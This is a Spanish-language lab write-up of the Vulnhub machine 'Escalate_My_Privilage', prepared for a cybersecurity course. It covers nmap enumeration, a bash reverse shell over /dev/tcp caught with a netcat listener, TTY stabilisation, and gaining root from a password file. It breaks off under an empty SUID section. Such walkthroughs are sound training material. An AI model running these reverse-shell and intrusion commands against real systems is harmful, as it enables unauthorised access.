
Esta es una maquina de [[Vulnhub]] que realizamos como practicas para la **Especialización de Ciberseguridad**.

# Que es lo que vamos a realizar 



# Enumeración
En la enumeración de esta maquina lo primero que vamos a hacer es escanear con el siguiente comando las maquinas que tenemos conectadas a nuestra red, ya que se trata de una VM de [[Vulnhub]].

```sh title:Escaneo
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f3:9a:eb, IPv4: 192.168.79.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.79.1    00:50:56:c0:00:08       (Unknown)
192.168.79.2    00:50:56:f1:d2:f1       (Unknown)
192.168.79.141  00:0c:29:77:89:92       (Unknown)
192.168.79.254  00:50:56:e8:54:0b       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.865 seconds (137.27 hosts/sec). 4 responded
```

Como vemos en el comando las **IP** de la maquina es la *192.168.79.141* 

## Creación del entorno de Trabajo
Crearemos nuestro entorno de trabajo para hacer un mejor seguimiento de la maquina y tener una mejor organización de esta.

```sh title:Creacion_de_Trabajo
┌──(root㉿kali)-[/home/kali]
└─# mkdir
┌──(root㉿kali)-[/home/kali]
└─# cd Escalate_My_Privilage
┌──(root㉿kali)-[/home/kali/Escalate_My_Privilage]
└─# mkt
┌──(root㉿kali)-[/home/kali/Escalate_My_Privilage]
└─# ls
content  exploits  nmap  scripts
```

## Escaneo de Puertos 
En este paso lo que realizaremos son los escaneos de los puertos con [[Nmap]].
```sh title:Nmap
┌──(root㉿kali)-[/home/kali/Escalate_My_Privilage/nmap]
└─# nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 192.168.79.141 -oG Puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-14 07:42 EST
Initiating ARP Ping Scan at 07:42
Scanning 192.168.79.141 [1 port]
Completed ARP Ping Scan at 07:42, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 07:42
Scanning 192.168.79.141 [65535 ports]
Discovered open port 111/tcp on 192.168.79.141
Discovered open port 22/tcp on 192.168.79.141
Discovered open port 80/tcp on 192.168.79.141
Discovered open port 20048/tcp on 192.168.79.141
Discovered open port 2049/tcp on 192.168.79.141
Completed SYN Stealth Scan at 07:43, 26.34s elapsed (65535 total ports)
Nmap scan report for 192.168.79.141
Host is up, received arp-response (0.00067s latency).
Scanned at 2026-01-14 07:42:48 EST for 26s
Not shown: 65494 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
111/tcp   open  rpcbind syn-ack ttl 64
2049/tcp  open  nfs     syn-ack ttl 64
20048/tcp open  mountd  syn-ack ttl 64
MAC Address: 00:0C:29:77:89:92 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
           Raw packets sent: 131044 (5.766MB) | Rcvd: 42 (2.712KB)

# Esto es un escaneo que quita muchas funciones para realizar un escaneo mas rapido.
┌──(root㉿kali)-[/home/kali/Escalate_My_Privilage/nmap]
└─# extractPorts Puertos 
Command 'xclip' not found, but can be installed with:
apt install xclip

[*] Extracting information...

        [*] IP Address: 192.168.79.141
        [*] Open ports: 22,80,111,2049,20048

[*] Ports copied to clipboard

┌──(root㉿kali)-[/home/kali/Escalate_My_Privilage/nmap]
└─# nmap -p22,80,111,2049,20048 -sCV 192.168.79.141 -oN Objetivo              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-14 07:44 EST
Nmap scan report for 192.168.79.141
Host is up (0.00043s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:16:10:91:bd:d7:6c:06:df:a2:b9:b5:b9:3b:dd:b6 (RSA)
|   256 0e:a4:c9:fc:de:53:f6:1d:de:a9:de:e4:21:34:7d:1a (ECDSA)
|_  256 ec:27:1e:42:65:1c:4a:3b:93:1c:a1:75:be:00:22:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Check your Privilege
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 1 disallowed entry 
|_/phpbash.php
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      34417/udp6  nlockmgr
|   100021  1,3,4      38520/tcp6  nlockmgr
|   100021  1,3,4      45346/tcp   nlockmgr
|   100021  1,3,4      54162/udp   nlockmgr
|   100024  1          54097/udp6  status
|   100024  1          54171/udp   status
|   100024  1          54867/tcp   status
|   100024  1          59168/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl 3 (RPC #100227)
20048/tcp open  mountd  1-3 (RPC #100005)
MAC Address: 00:0C:29:77:89:92 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

## Entrar a la Web
Como vimos en el escaneo de [[Nmap]] la IP tiene una pagina web y también vimos que tienen el *robots.txt* y podemos ver lo que dice.
![[Pasted image 20260114125619.png]]

Y nos metemos en la maquina web para ver que es lo que contiene esto que no quiere que veamos (PD: esto también te lo ponía el Escaneo de [[Nmap]])
![[Pasted image 20260116101204.png]]

Como vemos que la maquina no esta proporcionando una pagina web con un panel donde podemos ejecutar código, por lo que podemos realizar es [[Reverse Shell]] y nosotros escuchamos con el [[NetCat]]. 
```sh title:Reverse_Shell
bash -i >& /dev/tcp/192.168.79.128/1234 0>&1
```
 ![[Pasted image 20260116101819.png]]
 ```sh title:NetCat
 nc -lvnp 1234
 ```
 ![[Pasted image 20260116102004.png]]
 Ahora tenemos una [[Reverse Shell]] de la maquina *Escalate_My_Privilage*, lo que vamos a realizar a continuación es Sanitizar la **TTY**
 ```sh title:TTY
 script /dev/null -c bash
 # Yo lo suelo hacer dos veces para verificar que se Iniciado el Script.
 ^Z
 # Salimos de la reverse shell para volver a entrar.
 stty raw -echo; fg
 ```
![[Pasted image 20260116102320.png]]

Ponemos lo siguiente :

```sh title:TTY
reset xterm
```

Y nos saldrá lo siguiente
![[Pasted image 20260116102446.png]]

Para ver la TTY de colores para que se mas visual usamos el siguiente comando.
```sh title:TTY
export TERM=xterm-256color
source /etc/skel/.bashrc
```

Ahora lo que procedemos es a investigar si podemos encontrar algo para **escalar privilegios** o mirar los que podemos hacer.

```sh title:Comprobacion_de_Permisos 
[apache@my_privilege armour]$ whoami
apache
[apache@my_privilege armour]$ id
uid=48(apache) gid=48(apache) groups=48(apache)
[apache@my_privilege armour]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for apache:
# Como no sabemos la contraseña de root no podemos ver si tenemos algun comando con privilegio de sudoers en este usuario.
[apache@my_privilege html]$ find / -perm -4000 -type f 2>/dev/null
# Nos da una lista de los permisos que tenemos con este usuario
# En esta lista podemos ver Bastantes manera de hacer una escalada de Privilegios, ya que esta maquina esta hecha para hacer todas las escaladas de privilegios posibles.
```

Aun sabiendo lo anterior también es muy importante investigar por encima el sistema por si el usuario se dejo algo critico en él.

```sh title:Investigacion
[apache@my_privilege html]$ cd ..
[apache@my_privilege www]$ ls
cgi-bin  html
[apache@my_privilege www]$ cd ..
[apache@my_privilege var]$ ls
adm    db     gopher    local  mail  preserve  spool   var
cache  empty  kerberos  lock   nis   run       target  www
crash  games  lib       log    opt   snap      tmp     yp
[apache@my_privilege var]$ cd 
bash: cd: HOME not set
[apache@my_privilege var]$ ls
adm    db     gopher    local  mail  preserve  spool   var
cache  empty  kerberos  lock   nis   run       target  www
crash  games  lib       log    opt   snap      tmp     yp
[apache@my_privilege var]$ cd ..
[apache@my_privilege /]$ ls
backup  boot  etc   lib    media  opt   root  sbin    snap  sys  usr
bin     dev   home  lib64  mnt    proc  run   script  srv   tmp  var
[apache@my_privilege /]$ cd home/
[apache@my_privilege home]$ ks
bash: ks: command not found
[apache@my_privilege home]$ ls
armour
[apache@my_privilege home]$ cd armour/
[apache@my_privilege armour]$ ls
Credentials.txt  backup.sh  runme.sh
```

# Escalada de Privilegios
En este apartado realizaremos todas las posibles escaladas de Privilegios que se pueden hacer en esta maquina.

Vamos a comenzar por la de la de Investigación 
## Por Investigación
Tras al investigación anteriormente realizada vimos un archivo **Credentials.txt** 

```sh title:Investigación
[apache@my_privilege armour]$ cat Credentials.txt 
my password is
md5("Contraseña de Root")
# Probamos si funciona 
[apache@my_privilege armour]$ su root 
Password: 
[root@my_privilege armour]$ whoami
root
```

## Por "SUID"
